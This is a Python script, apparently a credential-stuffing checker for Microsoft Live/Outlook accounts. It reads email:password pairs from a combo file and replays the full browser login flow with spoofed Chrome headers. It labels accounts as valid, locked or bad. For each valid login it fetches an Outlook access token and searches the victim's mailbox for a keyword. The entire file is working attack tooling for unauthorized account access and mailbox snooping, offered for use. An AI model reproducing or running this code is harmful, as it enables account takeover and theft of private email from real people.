import requests
import json
import re
from urllib.parse import quote
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Initialize colorama for cross-platform color support
init(autoreset=True)

def url_encode(s):
    return quote(s)

def parse_lr(text, left, right):
    pattern = re.escape(left) + "(.*?)" + re.escape(right)
    match = re.search(pattern, text, re.DOTALL)
    return match.group(1) if match else ""

def parse_css(html, selector, attribute):
    soup = BeautifulSoup(html, 'html.parser')
    element = soup.select_one(selector)
    return element[attribute] if element else ""

def check_account(email, password):
    session = requests.Session()
    # Set a maximum number of redirects to prevent excessive redirects
    session.max_redirects = 10

    try:
        # Request 1
        headers = {
            "Host": "live.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        response = session.get("https://live.com/", headers=headers)
        clid = session.cookies.get("ClientId", "")

        # Request 2
        headers = {
            "Host": "go.microsoft.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://www.microsoft.com/",
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        response = session.get("https://go.microsoft.com/fwlink/p/?linkid=2125442&clcid=0x40c&culture=fr-fr&country=fr", headers=headers)
        source = response.text
        
        opid = parse_lr(source, "https://login.live.com/GetCredentialType.srf?opid=", "'")
        uid = parse_lr(opid, "&uaid=", "")
        pp = parse_lr(source, 'id="i0327" value="', '"')
        cobrandid = parse_lr(source, "https://login.live.com/ppsecure/post.srf?cobrandid=", "'")

        # Request 3
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "client-request-id": uid,
            "Content-type": "application/json; charset=UTF-8",
            "hpgid": "33",
            "Accept": "application/json",
            "hpgact": "0",
            "sec-ch-ua-platform": '"Windows"',
            "Origin": "https://login.live.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": response.url,
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        data = {
            "username": email,
            "uaid": uid,
            "isOtherIdpSupported": True,
            "checkPhones": False,
            "isRemoteNGCSupported": True,
            "isCookieBannerShown": False,
            "isFidoSupported": True,
            "forceotclogin": False,
            "otclogindisallowed": False,
            "isExternalFederationDisallowed": False,
            "isRemoteConnectSupported": False,
            "federationFlags": 3,
            "isSignup": False,
            "flowToken": pp
        }
        response = session.post(f"https://login.live.com/GetCredentialType.srf?opid={opid}", headers=headers, json=data)
        
        if "\"HasPassword\":1" not in response.text:
            return "BAD"

        # Request 4
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": response.url,
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        data = f"i13=0&login={url_encode(email)}&loginfmt={url_encode(email)}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={url_encode(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={url_encode(pp)}&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=7799"
        response = session.post(f"https://login.live.com/ppsecure/post.srf?cobrandid={cobrandid}", headers=headers, data=data)
        
        if "Votre compte ou mot de passe est incorrect." in response.text:
            return "BAD"
        if "__Host-MSAAUTH" not in session.cookies:
            return "BAD"
        if response.status_code != 200:
            return "BAD"
        if any(key in response.text for key in ["action=\"https://account.live.com/recover?", "action=\"https://account.live.com/Abuse?", "action=\"https://account.live.com/ar/cancel?", "Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrects", "action=\"https://account.live.com/identity/confirm?"]):
            return "LOCKED"

        # Request 5
        url_post = parse_lr(response.text, "],urlPost:'", "'")
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": response.url,
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        data = f"LoginOptions=1&type=28&ctx=&hpgrequestid=&PPFT={url_encode(pp)}&i19=1510"
        response = session.post(url_post, headers=headers, data=data)

        if response.status_code != 200:
            return "BAD"

        # Parse values for the next request
        nap_exp = parse_css(response.text, '[name="NAPExp"]', "value")
        wbids = parse_css(response.text, '[name="wbids"]', "value")
        pprid = parse_css(response.text, '[name="pprid"]', "value")
        wbid = parse_css(response.text, '[name="wbid"]', "value")
        nap = parse_css(response.text, '[name="NAP"]', "value")
        anon = parse_css(response.text, '[name="ANON"]', "value")
        anon_exp = parse_css(response.text, '[name="ANONExp"]', "value")
        t = parse_css(response.text, '[name="t"]', "value")

        # Request 6
        fmhf_action = parse_css(response.text, '[name="fmHF"]', "action")
        headers = {
            "Host": "outlook.live.com",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://login.live.com/",
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        data = f"NAPExp={url_encode(nap_exp)}&wbids={url_encode(wbids)}&pprid={url_encode(pprid)}&wbid={url_encode(wbid)}&NAP={url_encode(nap)}&ANON={url_encode(anon)}&ANONExp={url_encode(anon_exp)}&t={url_encode(t)}"
        response = session.post(fmhf_action, headers=headers, data=data)

        if response.status_code != 200 or "/mail/" not in response.url:
            return "BAD"

        # Request 7
        mscv = response.headers.get("MS-CV", "")
        cana = session.cookies.get("X-OWA-CANARY", "")

        headers = {
            "Host": "outlook.live.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "x-owa-sessionid": "fc9dca28-27dc-4973-81c7-a74dda9d9d82",
            "prefer": 'exchange.behavior="IncludeThirdPartyOnlineMeetingProviders"',
            "x-req-source": "Mail",
            "x-owa-canary": cana,
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "content-type": "application/json; charset=utf-8",
            "x-owa-urlpostdata": "%7B%22__type%22%3A%22TokenRequest%3A%23Exchange%22%2C%22Resource%22%3A%22https%3A%2F%2Foutlook.live.com%22%7D",
            "action": "GetAccessTokenforResource",
            "x-owa-correlationid": "2a586c25-42b5-dba0-4a40-61a6b15038b6",
            "ms-cv": mscv,
            "x-owa-hosted-ux": "false",
            "sec-ch-ua-platform": '"Windows"',
            "Accept": "*/*",
            "Origin": "https://outlook.live.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://outlook.live.com/",
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        response = session.post("https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail&n=14", headers=headers)
        
        if response.status_code != 200 or "AccessToken" not in response.text:
            return "BAD"

        aat = json.loads(response.text)["AccessToken"]

        # Request 8
        headers = {
            "Host": "outlook.live.com",
            "Connection": "keep-alive",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "x-search-griffin-version": "GWSv2",
            "x-owa-sessionid": "fc9dca28-27dc-4973-81c7-a74dda9d9d82",
            "scenariotag": "1stPg_mg",
            "x-ms-appname": "owa-reactmail",
            "accept-language": "fr-FR",
            "authorization": f"Bearer {aat}",
            "ms-cv": mscv,
            "sec-ch-ua-platform": '"Windows"',
            "x-clientid": clid,
            "x-owa-canary": cana,
            "x-req-source": "Mail",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "content-type": "application/json",
            "client-session-id": "cc308453-4f7a-f827-1a54-d0b77e155d32",
            "x-owa-hosted-ux": "false",
            "Accept": "*/*",
            "Origin": "https://outlook.live.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://outlook.live.com/",
            "Accept-Encoding": "gzip, deflate"
        }
        data = {
            "Cvid": "2ef9b59c-781b-a9ae-e1c4-80705240c416",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Romance Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Message",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                "From": 0,
                "Query": {"QueryString": "<KEYWOORD>"},
                "Size": 25,
                "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3}, {"Field": "Time", "SortDirection": "Desc"}],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }],
            "AnswerEntityRequests": [{
                "Query": {"QueryString": "<KEYWOORD>"},
                "EntityTypes": ["Event", "File"],
                "From": 0,
                "Size": 10,
                "EnableAsyncResolution": True
            }],
            "WholePageRankingOptions": {"EntityResultTypeRankingOptions": [{"ResultType": "Answer", "MaxEntitySetCount": 6}], "DedupeBehaviorHint": 1},
            "QueryAlterationOptions": {"EnableSuggestion": True, "EnableAlteration": True, "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]},
            "LogicalId": "3f041d4d-6f76-efc4-c570-8001301f65c5"
        }
        response = session.post(f"https://outlook.live.com/search/api/v2/query?n=55&cv={mscv}", headers=headers, json=data)
        
        if response.status_code != 200:
            return "BAD"
        
        if "NormalizedSubject" not in response.text:
            return "CUSTOM"

        total = json.loads(response.text)["EntitySets"][0]["Total"]
        return f"HIT ({total})"

    except requests.exceptions.TooManyRedirects:
        return "ERROR: Too many redirects"
    except requests.exceptions.RequestException as e:
        return f"ERROR: {str(e)}"
    except Exception as e:
        return f"ERROR: {str(e)}"

def main():
    with open("hot.txt", "r") as f:
        combos = f.readlines()

    for i, combo in enumerate(combos, 1):
        email, password = combo.strip().split(":")
        result = check_account(email, password)
        
        if result.startswith("HIT"):
            color = Fore.GREEN
        elif result == "LOCKED":
            color = Fore.YELLOW
        elif result.startswith("ERROR"):
            color = Fore.MAGENTA
        else:
            color = Fore.RED
        
        print(f"{i}. {email}:{password} => STATUS: {color}{result}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()

print("Script execution completed.")
